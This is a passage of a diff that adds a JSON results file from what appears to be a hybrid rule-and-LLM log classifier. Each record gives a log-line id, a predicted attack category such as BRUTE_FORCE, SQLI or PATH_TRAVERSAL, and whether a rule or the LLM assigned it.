+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:15",
+   "pred": "XSS",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:16",
+   "pred": "XSS",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:17",
+   "pred": "PATH_TRAVERSAL",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:18",
+   "pred": "PATH_TRAVERSAL",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:19",
+   "pred": "PATH_TRAVERSAL",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:20",
+   "pred": "PATH_TRAVERSAL",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:21",
+   "pred": "PATH_TRAVERSAL",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:22",
+   "pred": "MALWARE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:23",
+   "pred": "MALWARE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:24",
+   "pred": "RECON",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:25",
+   "pred": "RECON",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:26",
+   "pred": "MALWARE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:27",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:28",
+   "pred": "RECON",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:29",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:30",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:31",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:32",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:33",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:34",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:35",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:36",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:37",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "sample_auth:0",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_auth:1",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_auth:2",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_auth:3",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_auth:4",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_auth:5",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_auth:6",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_auth:7",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_auth:8",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_auth:9",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_auth:10",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_auth:11",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_auth:12",
+   "pred": "PRIV_ESC",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_auth:13",
+   "pred": "PRIV_ESC",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_auth:14",
+   "pred": "CMD_INJECTION",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_auth:15",
+   "pred": "PRIV_ESC",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:0",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:1",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:2",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:3",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:4",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:5",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:6",
+   "pred": "MALWARE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:7",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:8",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:9",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:10",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:11",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:12",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:13",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:14",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:15",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:16",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:17",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:18",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:19",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:20",
+   "pred": "MALWARE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:21",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:22",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:23",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:24",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:25",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:26",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:27",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:28",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:29",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:30",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:31",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:32",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:33",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:34",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:35",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:36",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:37",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:38",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:39",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:40",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:41",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:42",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:43",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:44",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:45",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:46",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:47",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:48",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:49",
+   "pred": "SQLI",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:50",
+   "pred": "SQLI",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:51",
+   "pred": "SQLI",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:52",
+   "pred": "XSS",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:53",
+   "pred": "XSS",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:54",
+   "pred": "PATH_TRAVERSAL",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:55",
+   "pred": "PATH_TRAVERSAL",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:56",
+   "pred": "SSRF",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:57",
+   "pred": "SSRF",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:58",
+   "pred": "LOG4SHELL",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:59",
+   "pred": "CMD_INJECTION",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:60",
+   "pred": "MALWARE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:61",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:62",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:63",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:64",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:65",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:66",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:67",
+   "pred": "RECON",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:68",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:69",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:70",
+   "pred": "RECON",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:71",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:72",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:73",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:74",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:75",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:76",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:77",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:78",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:79",
+   "pred": "MALWARE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:80",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:81",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:82",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:83",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:84",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:85",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:86",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "nginx2:87",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:0",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:1",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:2",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:3",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:4",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:5",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:6",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:7",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:8",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:9",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:10",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:11",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:12",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:13",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:14",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:15",
+   "pred": "CMD_INJECTION",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:16",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:17",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:18",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:19",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:20",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:21",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:22",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:23",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:24",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:25",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:26",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:27",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:28",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:29",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:30",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:31",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:32",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:33",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:34",
+   "pred": "BRUTE_FORCE",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:35",
+   "pred": "PRIV_ESC",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:36",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:37",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:38",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:39",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:40",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:41",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:42",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:43",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:44",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:45",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:46",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:47",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:48",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:49",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "auth2:50",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "inject_test:0",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "inject_test:1",
+   "pred": "MALWARE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "inject_test:2",
+   "pred": "SQLI",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "inject_test:3",
+   "pred": "RECON",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "inject_test:4",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "inject_test:5",
+   "pred": "PATH_TRAVERSAL",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "inject_test:6",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "inject_test:7",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "llm_failed": false
+  },
+  {
+   "id": "inject_test:8",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "inject_test:9",
+   "pred": "SSRF",
+   "src": "rule",
+   "llm_failed": false
+  }
+ ]
+}
